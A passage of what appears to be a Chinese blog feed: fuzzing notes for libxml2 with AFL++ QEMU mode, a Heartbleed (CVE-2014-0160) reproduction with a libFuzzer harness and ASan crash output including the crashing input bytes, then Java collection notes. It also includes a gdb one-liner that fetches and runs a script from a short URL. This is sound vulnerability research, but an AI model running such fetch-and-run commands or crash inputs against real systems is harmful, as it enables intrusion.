unused       ├───────────────────────┘</span><br><span class="line">│    trim/eff : 13.36%/188k, disabled                │          [cpu000:150%]</span><br><span class="line">└────────────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure>

<h2 id="QEMU-mode"><a href="#QEMU-mode" class="headerlink" title="QEMU mode"></a>QEMU mode</h2><p>假设我们没有源代码，所以就不能对源代码进行打补丁，所以我们就只能使用QEMU模式来对二进制文件来进行插桩。</p>
<p>首先需要的是编译程序（需要恢复对之前源代码的操作）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ../libxml2</span><br><span class="line">$ make clean</span><br><span class="line">$ make</span><br><span class="line">$ <span class="built_in">cp</span> xmllint ../fuzz/</span><br><span class="line">$ ../AFLplusplus/afl-fuzz -i <span class="keyword">in</span>/ -o out -m none -d -Q -- ./xmllint @@</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">           american fuzzy lop ++3.15a (default) [fast] &#123;0&#125;</span><br><span class="line">┌─ process timing ────────────────────────────────────┬─ overall results ────┐</span><br><span class="line">│ run time : 0 days, 19 hrs, 48 min, 42 sec │ cycles done : 0 │</span><br><span class="line">│ last new path : 0 days, 0 hrs, 0 min, 35 sec │ total paths : 3332 │</span><br><span class="line">│ last uniq crash : none seen yet │ uniq crashes : 0 │</span><br><span class="line">│ last uniq hang : 0 days, 0 hrs, 41 min, 25 sec │ uniq hangs : 2 │</span><br><span class="line">├─ cycle progress ─────────────────────┬─ map coverage┴──────────────────────┤</span><br><span class="line">│ now processing : 2335.9 (70.1%) │ map density : 3.47% / 11.94% │</span><br><span class="line">│ paths timed out : 0 (0.00%) │ count coverage : 3.53 bits/tuple │</span><br><span class="line">├─ stage progress ─────────────────────┼─ findings in depth ─────────────────┤</span><br><span class="line">│ now trying : splice 8 │ favored paths : 445 (13.36%) │</span><br><span class="line">│ stage execs : 51/110 (46.36%) │ new edges on : 807 (24.22%) │</span><br><span class="line">│ total execs : 10.5M │ total crashes : 0 (0 unique) │</span><br><span class="line">│ exec speed : 244.3/sec │ total tmouts : 4802 (272 unique) │</span><br><span class="line">├─ fuzzing strategy yields ────────────┴─────────────┬─ path geometry ───────┤</span><br><span class="line">│ bit flips : disabled (default, enable with -D) │ levels : 24 │</span><br><span class="line">│ byte flips : disabled (default, enable with -D) │ pending : 2401 │</span><br><span class="line">│ arithmetics : disabled (default, enable with -D) │ pend fav : 0 │</span><br><span class="line">│ known ints : disabled (default, enable with -D) │ own finds : 3329 │</span><br><span class="line">│ dictionary : n/a │ imported : 0 │</span><br><span class="line">│havoc/splice : 2147/5.38M, 1182/5.04M │ stability : 98.82% │</span><br><span class="line">│py/custom/rq : unused, unused, unused, unused ├───────────────────────┘</span><br><span class="line">│ trim/eff : 12.08%/53.4k, disabled │ [cpu000:750%]</span><br><span class="line">└────────────────────────────────────────────────────┘^C</span><br></pre></td></tr></table></figure>





<p>git clone 不行就是因为终端没有走代理，设置一些即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config –global http.proxy “192.168.1.238:1080”</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://aflplus.plus/docs/tutorials/libxml2_tutorial/">https://aflplus.plus/docs/tutorials/libxml2_tutorial/</a></p>
]]></content>
      <categories>
        <category>fuzzing</category>
      </categories>
      <tags>
        <tag>AFL</tag>
        <tag>Fuzzing</tag>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>heartbleed(CVE-2014-0160)</title>
    <url>/2021/11/14/heartbleed-CVE-2014-0160/</url>
    <content><![CDATA[<h1 id="心脏滴血漏洞复现（CVE-2014-0160）"><a href="#心脏滴血漏洞复现（CVE-2014-0160）" class="headerlink" title="心脏滴血漏洞复现（CVE 2014-0160）"></a>心脏滴血漏洞复现（CVE 2014-0160）</h1><p>基本信息</p>
<p>OpenSSL版本：1.0.1</p>
<p>fuzzer：libfuzzer</p>
<span id="more"></span>

<h2 id="编译OpenSSL"><a href="#编译OpenSSL" class="headerlink" title="编译OpenSSL"></a>编译OpenSSL</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar xzf openssl1.0.1f.tgz</span><br><span class="line"><span class="built_in">cd</span> openssl1.0.1f/</span><br><span class="line"></span><br><span class="line">./config</span><br><span class="line">make clean</span><br><span class="line">make CC=<span class="string">&quot;clang -O2 -fno-omit-frame-pointer -g -fsanitize=address,fuzzer -fsanitize-coverage=trace-pc-guard,trace-cmp,trace-gep,trace-div&quot;</span> -j$(<span class="built_in">nproc</span>)</span><br></pre></td></tr></table></figure>

<p>首先是按照教程，但是后面会报错，因为高版本的libfuzzer并不支持了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-fsanitize-coverage=trace-pc-guard is no longer supported by libFuzzer.</span><br></pre></td></tr></table></figure>

<p>本来想的是修改libfuzzer的版本，但是，并不能成功，所以就参考libfuzzer官方的使用方法，在编译目标程序的时候命令修改成下面的形式（直接删除就好了）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make CC=<span class="string">&quot;clang -O2 -fno-omit-frame-pointer -g -fsanitize=fuzzer -fsanitize-coverage=trace-cmp,trace-gep,trace-div&quot;</span> -j$(<span class="built_in">nproc</span>)</span><br></pre></td></tr></table></figure>

<h2 id="编译fuzzer-target"><a href="#编译fuzzer-target" class="headerlink" title="编译fuzzer target"></a>编译fuzzer target</h2><p>The first step in using libFuzzer on a library is to implement a <em>fuzz target</em> – a function that accepts an array of bytes and does something interesting with these bytes using the API under test. like this:</p>
<figure class="highlight cc"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fuzz_target.cc</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="type">int</span> <span class="title">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *Data, <span class="type">size_t</span> Size)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DoSomethingInterestingWithMyAPI</span>(Data, Size);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">// Non-zero return values are reserved for future use.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//openssl_fuzzer.cc</span></span><br><span class="line"><span class="comment">// Copyright 2016 Google Inc. All Rights Reserved.</span></span><br><span class="line"><span class="comment">// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/ssl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CERT_PATH</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> CERT_PATH</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">SSL_CTX *<span class="title">Init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">SSL_library_init</span>();</span><br><span class="line">  <span class="built_in">SSL_load_error_strings</span>();</span><br><span class="line">  <span class="built_in">ERR_load_BIO_strings</span>();</span><br><span class="line">  <span class="built_in">OpenSSL_add_all_algorithms</span>();</span><br><span class="line">  SSL_CTX *sctx;</span><br><span class="line">  <span class="built_in">assert</span> (sctx = <span class="built_in">SSL_CTX_new</span>(<span class="built_in">TLSv1_method</span>()));</span><br><span class="line">  <span class="comment">/* These two file were created with this command:</span></span><br><span class="line"><span class="comment">      openssl req -x509 -newkey rsa:512 -keyout server.key \</span></span><br><span class="line"><span class="comment">     -out server.pem -days 9999 -nodes -subj /CN=a/</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="built_in">assert</span>(<span class="built_in">SSL_CTX_use_certificate_file</span>(sctx, CERT_PATH <span class="string">&quot;server.pem&quot;</span>,</span><br><span class="line">                                      SSL_FILETYPE_PEM));</span><br><span class="line">  <span class="built_in">assert</span>(<span class="built_in">SSL_CTX_use_PrivateKey_file</span>(sctx, CERT_PATH <span class="string">&quot;server.key&quot;</span>,</span><br><span class="line">                                     SSL_FILETYPE_PEM));</span><br><span class="line">  <span class="keyword">return</span> sctx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="type">int</span> <span class="title">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *data, <span class="type">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="type">static</span> SSL_CTX *sctx = <span class="built_in">Init</span>();</span><br><span class="line">  SSL *server = <span class="built_in">SSL_new</span>(sctx);</span><br><span class="line">  BIO *sinbio = <span class="built_in">BIO_new</span>(<span class="built_in">BIO_s_mem</span>());</span><br><span class="line">  BIO *soutbio = <span class="built_in">BIO_new</span>(<span class="built_in">BIO_s_mem</span>());</span><br><span class="line">  <span class="built_in">SSL_set_bio</span>(server, sinbio, soutbio);</span><br><span class="line">  <span class="built_in">SSL_set_accept_state</span>(server);</span><br><span class="line">  <span class="built_in">BIO_write</span>(sinbio, data, size);</span><br><span class="line">  <span class="built_in">SSL_do_handshake</span>(server);</span><br><span class="line">  <span class="built_in">SSL_free</span>(server);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">clang++ -g openssl_fuzzer.cc -O2 -fno-omit-frame-pointer -fsanitize=address,fuzzer \</span><br><span class="line">    -fsanitize-coverage=trace-cmp,trace-gep,trace-div \</span><br><span class="line">    -Iopenssl1.0.1f/include openssl1.0.1f/libssl.a openssl1.0.1f/libcrypto.a \</span><br><span class="line">    ../../libFuzzer/libFuzzer.a -o openssl_fuzzer</span><br></pre></td></tr></table></figure>

<p>然后创建一个文件夹，使用生成的<code>openssl_fuzzer</code>来测试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> corpus1</span><br><span class="line">./openssl_fuzzer ./corpus1/</span><br></pre></td></tr></table></figure>

<p>然后就可以看到程序报错了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=================================================================</span><br><span class="line">==4447==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x629000009748 at pc 0x000000435777 bp 0x7ffcbf76d0a0 sp 0x7ffcbf76c860</span><br><span class="line">READ of size 48384 at 0x629000009748 thread T0</span><br><span class="line">    #0 0x435776 in memcpy (/home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl_fuzzer+0x435776)</span><br><span class="line">    #1 0x4ce5cf in tls1_process_heartbeat /home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl1.0.1f/ssl/t1_lib.c:2586:3</span><br><span class="line">    #2 0x503b43 in ssl3_read_bytes /home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl1.0.1f/ssl/s3_pkt.c:1092:4</span><br><span class="line">    #3 0x50559b in ssl3_get_message /home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl1.0.1f/ssl/s3_both.c:457:7</span><br><span class="line">    #4 0x4ed420 in ssl3_get_client_hello /home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl1.0.1f/ssl/s3_srvr.c:941:4</span><br><span class="line">    #5 0x4eb8fe in ssl3_accept /home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl1.0.1f/ssl/s3_srvr.c:357:9</span><br><span class="line">    #6 0x4c92e2 in LLVMFuzzerTestOneInput /home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl_fuzzer.cc:39:3</span><br><span class="line">    #7 0x67f862 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /home/fourth/fuzz/libfuzzer-workshop-master/libFuzzer/Fuzzer/FuzzerLoop.cpp:556:15</span><br><span class="line">    #8 0x67eea5 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /home/fourth/fuzz/libfuzzer-workshop-master/libFuzzer/Fuzzer/FuzzerLoop.cpp:470:3</span><br><span class="line">    #9 0x6804b7 in fuzzer::Fuzzer::MutateAndTestOne() /home/fourth/fuzz/libfuzzer-workshop-master/libFuzzer/Fuzzer/FuzzerLoop.cpp:698:19</span><br><span class="line">    #10 0x681005 in fuzzer::Fuzzer::Loop(std::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/fourth/fuzz/libfuzzer-workshop-master/libFuzzer/Fuzzer/FuzzerLoop.cpp:830:5</span><br><span class="line">    #11 0x670076 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /home/fourth/fuzz/libfuzzer-workshop-master/libFuzzer/Fuzzer/FuzzerDriver.cpp:824:6</span><br><span class="line">    #12 0x66b1a0 in main /home/fourth/fuzz/libfuzzer-workshop-master/libFuzzer/Fuzzer/FuzzerMain.cpp:19:10</span><br><span class="line">    #13 0x7f7f3f2010b2 in __libc_start_main /build/glibc-eX1tMB/glibc-2.31/csu/../csu/libc-start.c:308:16</span><br><span class="line">    #14 0x41ea1d in _start (/home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl_fuzzer+0x41ea1d)</span><br><span class="line"></span><br><span class="line">0x629000009748 is located 0 bytes to the right of 17736-byte region [0x629000005200,0x629000009748)</span><br><span class="line">allocated by thread T0 here:</span><br><span class="line">    #0 0x49715d in malloc (/home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl_fuzzer+0x49715d)</span><br><span class="line">    #1 0x519b0b in CRYPTO_malloc /home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl1.0.1f/crypto/mem.c:308:8</span><br><span class="line">    #2 0x505f7b in freelist_extract /home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl1.0.1f/ssl/s3_both.c:708:12</span><br><span class="line">    #3 0x505f7b in ssl3_setup_read_buffer /home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl1.0.1f/ssl/s3_both.c:770:10</span><br><span class="line">    #4 0x5062ec in ssl3_setup_buffers /home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl1.0.1f/ssl/s3_both.c:827:7</span><br><span class="line">    #5 0x4eb807 in ssl3_accept /home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl1.0.1f/ssl/s3_srvr.c:292:9</span><br><span class="line">    #6 0x4c92e2 in LLVMFuzzerTestOneInput /home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl_fuzzer.cc:39:3</span><br><span class="line">    #7 0x67f862 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /home/fourth/fuzz/libfuzzer-workshop-master/libFuzzer/Fuzzer/FuzzerLoop.cpp:556:15</span><br><span class="line">    #8 0x6808b8 in fuzzer::Fuzzer::ReadAndExecuteSeedCorpora(std::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/fourth/fuzz/libfuzzer-workshop-master/libFuzzer/Fuzzer/FuzzerLoop.cpp:743:3</span><br><span class="line">    #9 0x680dd9 in fuzzer::Fuzzer::Loop(std::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/fourth/fuzz/libfuzzer-workshop-master/libFuzzer/Fuzzer/FuzzerLoop.cpp:792:3</span><br><span class="line">    #10 0x670076 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /home/fourth/fuzz/libfuzzer-workshop-master/libFuzzer/Fuzzer/FuzzerDriver.cpp:824:6</span><br><span class="line">    #11 0x66b1a0 in main /home/fourth/fuzz/libfuzzer-workshop-master/libFuzzer/Fuzzer/FuzzerMain.cpp:19:10</span><br><span class="line">    #12 0x7f7f3f2010b2 in __libc_start_main /build/glibc-eX1tMB/glibc-2.31/csu/../csu/libc-start.c:308:16</span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: heap-buffer-overflow (/home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl_fuzzer+0x435776) in memcpy</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  0x0c527fff9290: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x0c527fff92a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x0c527fff92b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x0c527fff92c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x0c527fff92d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">=&gt;0x0c527fff92e0: 00 00 00 00 00 00 00 00 00[fa]fa fa fa fa fa fa</span><br><span class="line">  0x0c527fff92f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c527fff9300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c527fff9310: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c527fff9320: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c527fff9330: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">Shadow byte legend (one shadow byte represents 8 application bytes):</span><br><span class="line">  Addressable:           00</span><br><span class="line">  Partially addressable: 01 02 03 04 05 06 07 </span><br><span class="line">  Heap left redzone:       fa</span><br><span class="line">  Freed heap region:       fd</span><br><span class="line">  Stack left redzone:      f1</span><br><span class="line">  Stack mid redzone:       f2</span><br><span class="line">  Stack right redzone:     f3</span><br><span class="line">  Stack after return:      f5</span><br><span class="line">  Stack use after scope:   f8</span><br><span class="line">  Global redzone:          f9</span><br><span class="line">  Global init order:       f6</span><br><span class="line">  Poisoned by user:        f7</span><br><span class="line">  Container overflow:      fc</span><br><span class="line">  Array cookie:            ac</span><br><span class="line">  Intra object redzone:    bb</span><br><span class="line">  ASan internal:           fe</span><br><span class="line">  Left alloca redzone:     ca</span><br><span class="line">  Right alloca redzone:    cb</span><br><span class="line">  Shadow gap:              cc</span><br><span class="line">==4447==ABORTING</span><br><span class="line">MS: 2 InsertByte-InsertByte-; base unit: 6409fc1658e8c93af3744d90dd4f7eb4dbc6e488</span><br><span class="line">0x18,0x3,0xff,0x0,0xd,0x1,0xbd,0x0,0x0,0xb3,0x0,0x0,0x0,0x0,0x0,0xd,0xd,0xd,0xd,0xd,0xd,0x0,0x0,0x0,</span><br><span class="line">\x18\x03\xff\x00\x0d\x01\xbd\x00\x00\xb3\x00\x00\x00\x00\x00\x0d\x0d\x0d\x0d\x0d\x0d\x00\x00\x00</span><br><span class="line">artifact_prefix=&#x27;./&#x27;; Test unit written to ./crash-052a0bf2b9eddd783de293aa5452c3212975c9c1</span><br><span class="line">Base64: GAP/AA0BvQAAswAAAAAADQ0NDQ0NAAAA</span><br></pre></td></tr></table></figure>

<p>SUMMARY: AddressSanitizer: heap-buffer-overflow (&#x2F;home&#x2F;fourth&#x2F;fuzz&#x2F;libfuzzer-workshop-master&#x2F;lessons&#x2F;05&#x2F;openssl_fuzzer+0x435776) in memcpy</p>
<p>可以看到就是tls1_process_heartbeat这里出错了。</p>
<h2 id="crash分析"><a href="#crash分析" class="headerlink" title="crash分析"></a>crash分析</h2><p>在gdb中使用GEF来复现</p>
<p>注意，需要使用代理才可以使用该工具（或者你换一种使用方法也是可以的），使用的文件是上面fuzzing出来的crash文件（以id开头的文件）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains gdb -Q target</span><br><span class="line"></span><br><span class="line">(gdb)pi import urllib.request as u, tempfile as t; g=t.NamedTemporaryFile(suffix=<span class="string">&#x27;-gef.py&#x27;</span>); open(g.name, <span class="string">&#x27;wb+&#x27;</span>).write(u.urlopen(<span class="string">&#x27;https://tinyurl.com/gef-master&#x27;</span>).<span class="built_in">read</span>()); gdb.execute(<span class="string">&#x27;source %s&#x27;</span> % g.name)</span><br><span class="line"></span><br><span class="line">gef&gt; r &gt; <span class="built_in">id</span>:000000,sig:06,src:000004+000003,time:27696,op:splice,rep:4</span><br><span class="line"></span><br><span class="line">exploitable</span><br></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://releases.llvm.org/5.0.0/docs/LibFuzzer.html#fuzzing-components-of-llvm">https://releases.llvm.org/5.0.0/docs/LibFuzzer.html#fuzzing-components-of-llvm</a></p>
<p><a href="https://github.com/Dor1s/libfuzzer-workshop">https://github.com/Dor1s/libfuzzer-workshop</a></p>
<p><a href="https://trustfoundry.net/introduction-to-triaging-fuzzer-generated-crashes/">https://trustfoundry.net/introduction-to-triaging-fuzzer-generated-crashes/</a></p>
]]></content>
      <categories>
        <category>Fuzzing</category>
        <category>复现</category>
      </categories>
      <tags>
        <tag>notes</tag>
        <tag>libfuzzer</tag>
      </tags>
  </entry>
  <entry>
    <title>java collection</title>
    <url>/2018/01/27/java-collection/</url>
    <content><![CDATA[<h1 id="集合框架collection"><a href="#集合框架collection" class="headerlink" title="集合框架collection"></a>集合框架collection</h1><p>  是集合的顶层接口，他的子体系有重复的，有唯一的，有有序的，也有无序的。</p>
<p><img src="https://raw.githubusercontent.com/Dfault0/images/main/20220415125923.png"></p>
<span id="more"></span>

<h2 id="collection-基本函数"><a href="#collection-基本函数" class="headerlink" title="collection 基本函数"></a>collection 基本函数</h2><ul>
<li>添加：boolean add(E e)</li>
<li>删除：boolean remove(Object o)</li>
<li>判断：boolean isEmpty();boolean contains(Object o)</li>
<li>获取：Iterator<E> iterator()</li>
<li>长度：int size()</li>
</ul>
<table>
<thead>
<tr>
<th>Modifier and Type</th>
<th>Method and Description</th>
</tr>
</thead>
<tbody><tr>
<td><code>boolean</code></td>
<td><code>add(E e)</code>  确保此集合包含指定的元素（可选操作）。</td>
</tr>
<tr>
<td><code>boolean</code></td>
<td><code>addAll(Collection&lt;? extends E&gt; c)</code>  将指定集合中的所有元素添加到此集合（可选操作）。</td>
</tr>
<tr>
<td><code>void</code></td>
<td><code>clear()</code>  从此集合中删除所有元素（可选操作）。</td>
</tr>
<tr>
<td><code>boolean</code></td>
<td><code>contains(Object o)</code>  如果此集合包含指定的元素，则返回 <code>true</code> 。</td>
</tr>
<tr>
<td><code>boolean</code></td>
<td><code>containsAll(Collection&lt;?&gt; c)</code>  如果此集合包含指定 <code>集合</code>中的所有元素，则返回true。</td>
</tr>
<tr>
<td><code>boolean</code></td>
<td><code>equals(Object o)</code>  将指定的对象与此集合进行比较以获得相等性。</td>
</tr>
<tr>
<td><code>int</code></td>
<td><code>hashCode()</code>  返回此集合的哈希码值。</td>
</tr>
<tr>
<td><code>boolean</code></td>
<td><code>isEmpty()</code>  如果此集合不包含元素，则返回 <code>true</code> 。</td>
</tr>
<tr>
<td><code>Iterator&lt;E&gt;</code></td>
<td><code>iterator()</code>  返回此集合中的元素的迭代器。</td>
</tr>
<tr>
<td><code>default Stream&lt;E&gt;</code></td>
<td><code>parallelStream()</code>  返回可能并行的 <code>Stream</code>与此集合作为其来源。</td>
</tr>
<tr>
<td><code>boolean</code></td>
<td><code>remove(Object o)</code>  从该集合中删除指定元素的单个实例（如果存在）（可选操作）。</td>
</tr>
<tr>
<td><code>boolean</code></td>
<td><code>removeAll(Collection&lt;?&gt; c)</code>  删除指定集合中包含的所有此集合的元素（可选操作）。</td>
</tr>
<tr>
<td><code>default boolean</code></td>
<td><code>removeIf(Predicate&lt;? super E&gt; filter)</code>  删除满足给定谓词的此集合的所有元素。</td>
</tr>
<tr>
<td><code>boolean</code></td>
<td><code>retainAll(Collection&lt;?&gt; c)</code>  仅保留此集合中包含在指定集合中的元素（可选操作）。</td>
</tr>
<tr>
<td><code>int</code></td>
<td><code>size()</code>  返回此集合中的元素数。</td>
</tr>
<tr>
<td><code>default Spliterator&lt;E&gt;</code></td>
<td><code>spliterator()</code>  创建一个<a href="../../java/util/Spliterator.html"><code>Spliterator</code></a>在这个集合中的元素。</td>
</tr>
<tr>
<td><code>default Stream&lt;E&gt;</code></td>
<td><code>stream()</code>  返回以此集合作为源的顺序 <code>Stream</code> 。</td>
</tr>
<tr>
<td><code>Object[]</code></td>
<td><code>toArray()</code>  返回一个包含此集合中所有元素的数组。</td>
</tr>
<tr>
<td><code>&lt;T&gt; T[]</code></td>
<td><code>toArray(T[] a)</code>  返回包含此集合中所有元素的数组;  返回的数组的运行时类型是指定数组的运行时类型。</td>
</tr>
</tbody></table>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ul>
<li><p>List: (interface)</p>
<ul>
<li>ArrayList</li>
<li>Vector</li>
<li>LinkedList</li>
</ul>
</li>
<li><p>Set: (interface)</p>
<ul>
<li>HashSet</li>
<li>TreeSet</li>
</ul>
</li>
</ul>
<h2 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//A:将集合转换成数组</span></span><br><span class="line"><span class="comment">//B：迭代器</span></span><br><span class="line"><span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> arrayList.iterator();</span><br><span class="line"><span class="keyword">while</span>(iterator.hasNext()) &#123;</span><br><span class="line">	<span class="type">Student</span> <span class="variable">temp</span> <span class="operator">=</span> (Student) iterator.next();</span><br><span class="line">	System.out.println(temp.getName()+<span class="string">&#x27;,&#x27;</span>+temp.getAge());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//C：增强 for：</span></span><br><span class="line"><span class="keyword">for</span>(ArrayList&lt;Student&gt; arrayList:boss) &#123;</span><br><span class="line">	<span class="keyword">for</span>(Student temp:arrayList) &#123;</span><br><span class="line">		<span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> temp;</span><br><span class="line">		System.out.println(student.getName()+student.getAge());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="List"><a href="#List" class="headerlink" title="List"></a>List</h3><p>  有序，可重复</p>
<h4 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h4><ul>
<li><p>ArrayList：底层数据结构是数组，查询快，增删慢。线程不安全，效率高。</p>
</li>
<li><p>Vector：底层数据结构是数组，查询快，增删慢。线程安全，效率低。</p>
</li>
<li><p>LinkedList：底层数据结构是链表，查询慢，增删快。线程不安全，效率高。
  </p>
<ul>
<li><p>添加</p>
<ul>
<li>addFirst()    addLast()</li>
</ul>
</li>
<li><p>删除</p>
<ul>
<li>removeFirst()  removeLast()</li>
</ul>
</li>
<li><p>获取</p>
<ul>
<li>getFirst()  getLast()</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h3><p>set集合的特点：无序，且唯一（equals() 和 hashcode()）<br>注意：如果集合的元素是自定义对象，则需要重写equals() 和 hashcode()方法。（在eclipse中可以自动生成）</p>
<h4 id="分类-2"><a href="#分类-2" class="headerlink" title="分类"></a>分类</h4><ul>
<li><p>HashSet</p>
<ul>
<li>底层数据结构是哈希表(是一个元素为链表的数组)</li>
<li>哈希表底层依赖两个方法：hashCode()和equals()</li>
<li>添加元素执行顺序：</li>
<li>首先比较哈希值是否相同？<br>    相同：继续执行equals()方法<br>          返回true：元素重复了，不添加<br>          返回false：直接把元素添加到集合<br>      不同：就直接把元素添加到集合</li>
</ul>
</li>
<li><p>TreeSet</p>
<ul>
<li>底层数据结构是红黑树(是一个自平衡的二叉树)</li>
<li>保证元素的排序方式<ul>
<li>a:自然排序(元素具备比较性)：让元素所属的类实现Comparable接口</li>
<li>比较器排序(集合具备比较性)：让集合构造方法接收Comparator的实现类对象</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h1><p>基本函数</p>
<table>
<thead>
<tr>
<th>Modifier and Type</th>
<th>Method and Description</th>
</tr>
</thead>
<tbody><tr>
<td><code>void</code></td>
<td><code>clear()</code>  从该地图中删除所有的映射（可选操作）。</td>
</tr>
<tr>
<td><code>default V</code></td>
<td><code>compute(K key, BiFunction&lt;? super K,? super V,? extends V&gt; remappingFunction)</code>  尝试计算指定键的映射及其当前映射的值（如果没有当前映射， <code>null</code> ）。</td>
</tr>
<tr>
<td><code>default V</code></td>
<td><code>computeIfAbsent(K key, Function&lt;? super K,? extends V&gt; mappingFunction)</code>  如果指定的键尚未与值相关联（或映射到 <code>null</code>  ），则尝试使用给定的映射函数计算其值，并将其输入到此映射中，除非 <code>null</code> 。</td>
</tr>
<tr>
<td><code>default V</code></td>
<td><code>computeIfPresent(K key, BiFunction&lt;? super K,? super V,? extends V&gt; remappingFunction)</code>  如果指定的密钥的值存在且非空，则尝试计算给定密钥及其当前映射值的新映射。</td>
</tr>
<tr>
<td><code>boolean</code></td>
